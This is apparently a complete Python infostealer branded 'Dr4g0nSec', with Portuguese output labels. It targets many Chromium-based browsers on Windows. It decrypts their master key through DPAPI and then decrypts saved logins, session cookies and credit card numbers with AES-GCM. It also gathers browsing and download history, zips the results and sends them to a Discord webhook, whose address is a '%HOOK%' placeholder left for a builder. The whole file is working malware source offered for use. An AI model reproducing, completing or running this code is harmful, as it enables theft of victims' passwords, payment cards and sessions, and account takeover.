import base64
import json
import os
import shutil
import sqlite3
from pathlib import Path
from zipfile import ZipFile
import requests

from Crypto.Cipher import AES
from discord import Embed, File, SyncWebhook
from win32crypt import CryptUnprotectData

__LOGINS__ = []
__COOKIES__ = []
__WEB_HISTORY__ = []
__DOWNLOADS__ = []
__CARDS__ = []


class Browsers:
    def __init__(self, webhook):
        self.webhook = SyncWebhook.from_url(webhook)

        Chromium()
        Upload(self.webhook)

class Upload:
    def __init__(self, webhook: SyncWebhook):
        self.webhook = webhook
        self.temp_path = os.path.join(os.getenv("LOCALAPPDATA"), "Dr4g0nSec")

        self.write_files()
        self.send()
        self.clean()

    def write_files(self):
        os.makedirs(self.temp_path, exist_ok=True)

        if __LOGINS__:
            with open(os.path.join(self.temp_path, "logins.txt"), "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __LOGINS__))

        if __COOKIES__:
            with open(os.path.join(self.temp_path, "cookies.txt"), "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __COOKIES__))

        if __WEB_HISTORY__:
            with open(os.path.join(self.temp_path, "web_history.txt"), "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __WEB_HISTORY__))

        if __DOWNLOADS__:
            with open(os.path.join(self.temp_path, "downloads.txt"), "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __DOWNLOADS__))

        if __CARDS__:
            with open(os.path.join(self.temp_path, "cards.txt"), "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __CARDS__))

        self.zip_path = os.path.join(self.temp_path + ".zip")
        with ZipFile(self.zip_path, "w") as zipf:
            for file in os.listdir(self.temp_path):
                file_path = os.path.join(self.temp_path, file)
                zipf.write(file_path, file)

    def send(self):
        embed = Embed(
            title="<:conectados:1385867561589149748> Dr4g0nSec | Navegadores Info <:conectados:1385867561589149748>",
            description="```" + '\n'.join(self.tree(Path(self.temp_path))) + "```",
            color=0x250e80
        )
        embed.set_footer(
            text="Created by sk4rty | Dr4g0nSec on Top!",
            icon_url="https://i.pinimg.com/736x/b2/d6/d7/b2d6d766dfa4f99bb325ac908c7ed12d.jpg"
        )

        self.webhook.send(
            embed=embed,
            file=File(self.zip_path),
            username="Dr4g0nSec | Navegadores Info",
            avatar_url="https://i.imgur.com/83uCFZe.jpeg"
        )

    def clean(self):
        shutil.rmtree(self.temp_path)
        os.remove(self.zip_path)

    def tree(self, path: Path, prefix: str = '', midfix_folder: str = '📂 - ', midfix_file: str = '📄 - '):
        pipes = {
            'space':  '    ',
            'branch': '│   ',
            'tee':    '├──< ',
            'last':   '└──< ',
        }

        if prefix == '':
            yield midfix_folder + path.name

        contents = list(path.iterdir())
        pointers = [pipes['tee']] * (len(contents) - 1) + [pipes['last']]
        for pointer, path in zip(pointers, contents):
            if path.is_dir():
                yield f"{prefix}{pointer}{midfix_folder}{path.name} ({len(list(path.glob('**/*')))} files, {sum(f.stat().st_size for f in path.glob('**/*') if f.is_file()) / 1024:.2f} kb)"
                extension = pipes['branch'] if pointer == pipes['tee'] else pipes['space']
                yield from self.tree(path, prefix=prefix+extension)
            else:
                yield f"{prefix}{pointer}{midfix_file}{path.name} ({path.stat().st_size / 1024:.2f} kb)"


class Chromium:
    def __init__(self):
        self.appdata = os.getenv('LOCALAPPDATA')
        self.browsers = {
            'amigo': self.appdata + '\\Amigo\\User Data',
            'torch': self.appdata + '\\Torch\\User Data',
            'kometa': self.appdata + '\\Kometa\\User Data',
            'orbitum': self.appdata + '\\Orbitum\\User Data',
            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
            '7star': self.appdata + '\\7Star\\7Star\\User Data',
            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': self.appdata + '\\Iridium\\User Data',
        }
        self.profiles = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
        ]

        for _, path in self.browsers.items():
            if not os.path.exists(path):
                continue

            self.master_key = self.get_master_key(f'{path}\\Local State')
            if not self.master_key:
                continue

            for profile in self.profiles:
                if not os.path.exists(path + '\\' + profile):
                    continue

                operations = [
                    self.get_login_data,
                    self.get_cookies,
                    self.get_web_history,
                    self.get_downloads,
                    self.get_credit_cards,
                ]

                for operation in operations:
                    try:
                        operation(path, profile)
                    except Exception as e:

                        pass

    def get_master_key(self, path: str) -> str:
        if not os.path.exists(path):
            return

        if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
            return

        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()

        return decrypted_pass

    def get_login_data(self, path: str, profile: str):
        login_db = f'{path}\\{profile}\\Login Data'
        if not os.path.exists(login_db):
            return

        temp_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Dr4g0nSec')
        if not os.path.exists(temp_path):
            os.makedirs(temp_path)

        shutil.copy(login_db, os.path.join(temp_path, 'login_db'))
        conn = sqlite3.connect(os.path.join(temp_path, 'login_db'))
        cursor = conn.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2]:
                continue

            password = self.decrypt_password(row[2], self.master_key)
            __LOGINS__.append(Types.Login(row[0], row[1], password))

        conn.close()
        os.remove(os.path.join(temp_path, 'login_db'))


    def get_cookies(self, path: str, profile: str):
        cookie_db = f'{path}\\{profile}\\Network\\Cookies'
        if not os.path.exists(cookie_db):
            return

        temp_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Dr4g0nSec')
        if not os.path.exists(temp_path):
            os.makedirs(temp_path)

        try:
            shutil.copy(cookie_db, os.path.join(temp_path, 'cookie_db'))
            conn = sqlite3.connect(os.path.join(temp_path, 'cookie_db'))
            cursor = conn.cursor()
            cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')
            for row in cursor.fetchall():
                if not row[0] or not row[1] or not row[2] or not row[3]:
                    continue

                cookie = self.decrypt_password(row[3], self.master_key)
                __COOKIES__.append(Types.Cookie(row[0], row[1], row[2], cookie, row[4]))

            conn.close()
        except Exception as e:
            print(e)

        os.remove(os.path.join(temp_path, 'cookie_db'))

    def get_web_history(self, path: str, profile: str):
        web_history_db = f'{path}\\{profile}\\History'
        if not os.path.exists(web_history_db):
            return

        temp_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Dr4g0nSec')
        if not os.path.exists(temp_path):
            os.makedirs(temp_path)

        shutil.copy(web_history_db, os.path.join(temp_path, 'web_history_db'))
        conn = sqlite3.connect(os.path.join(temp_path, 'web_history_db'))
        cursor = conn.cursor()
        cursor.execute('SELECT url, title, last_visit_time FROM urls')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2]:
                continue

            __WEB_HISTORY__.append(Types.WebHistory(row[0], row[1], row[2]))

        conn.close()
        os.remove(os.path.join(temp_path, 'web_history_db'))

    def get_downloads(self, path: str, profile: str):
        downloads_db = f'{path}\\{profile}\\History'
        if not os.path.exists(downloads_db):
            return

        temp_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Dr4g0nSec')
        if not os.path.exists(temp_path):
            os.makedirs(temp_path)

        shutil.copy(downloads_db, os.path.join(temp_path, 'downloads_db'))
        conn = sqlite3.connect(os.path.join(temp_path, 'downloads_db'))
        cursor = conn.cursor()
        cursor.execute('SELECT tab_url, target_path FROM downloads')
        for row in cursor.fetchall():
            if not row[0] or not row[1]:
                continue

            __DOWNLOADS__.append(Types.Download(row[0], row[1]))

        conn.close()
        os.remove(os.path.join(temp_path, 'downloads_db'))

    def get_credit_cards(self, path: str, profile: str):
        cards_db = f'{path}\\{profile}\\Web Data'
        if not os.path.exists(cards_db):
            return

        temp_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Dr4g0nSec')
        if not os.path.exists(temp_path):
            os.makedirs(temp_path)

        shutil.copy(cards_db, os.path.join(temp_path, 'cards_db'))
        conn = sqlite3.connect(os.path.join(temp_path, 'cards_db'))
        cursor = conn.cursor()
        cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2] or not row[3]:
               continue

            card_number = self.decrypt_password(row[3], self.master_key)
            __CARDS__.append(Types.CreditCard(row[0], row[1], row[2], card_number, row[4]))

        conn.close()
        os.remove(os.path.join(temp_path, 'cards_db'))


class Types:
    class Login:
        def __init__(self, url, username, password):
            self.url = url
            self.username = username
            self.password = password

        def __str__(self):
            return f'Site: {self.url}\nUsuário: {self.username}\nSenha: {self.password}\n'

        def __repr__(self):
            return self.__str__()

    class Cookie:
        def __init__(self, host, name, path, value, expires):
            self.host = host
            self.name = name
            self.path = path
            self.value = value
            self.expires = expires

        def __str__(self):
            return f'Host: {self.host}\nNome: {self.name}\nPath: {self.path}\nValor: {self.value}\nExpira: {self.expires}\n'

        def __repr__(self):
            return self.__str__()

    class WebHistory:
        def __init__(self, url, title, timestamp):
            self.url = url
            self.title = title
            self.timestamp = timestamp

        def __str__(self):
            return f'URL: {self.url}\nTítulo: {self.title}\nÚltimo Acesso: {self.timestamp}\n'

        def __repr__(self):
            return self.__str__()

    class Download:
        def __init__(self, tab_url, target_path):
            self.tab_url = tab_url
            self.target_path = target_path

        def __str__(self):
            return f'Arquivo: {self.target_path}\nFonte: {self.tab_url}\n'

        def __repr__(self):
            return self.__str__()

    class CreditCard:
        def __init__(self, name, month, year, number, date_modified):
            self.name = name
            self.month = month
            self.year = year
            self.number = number
            self.date_modified = date_modified

        def __str__(self):
            return (f'Nome: {self.name}\nNúmero: {self.number}\n'
                    f'Validade: {self.month}/{self.year}\n'
                    f'Modificado: {self.date_modified}\n')

        def __repr__(self):
            return self.__str__()

        
W3BH00K_URL = "%HOOK%"
Browsers(W3BH00K_URL)
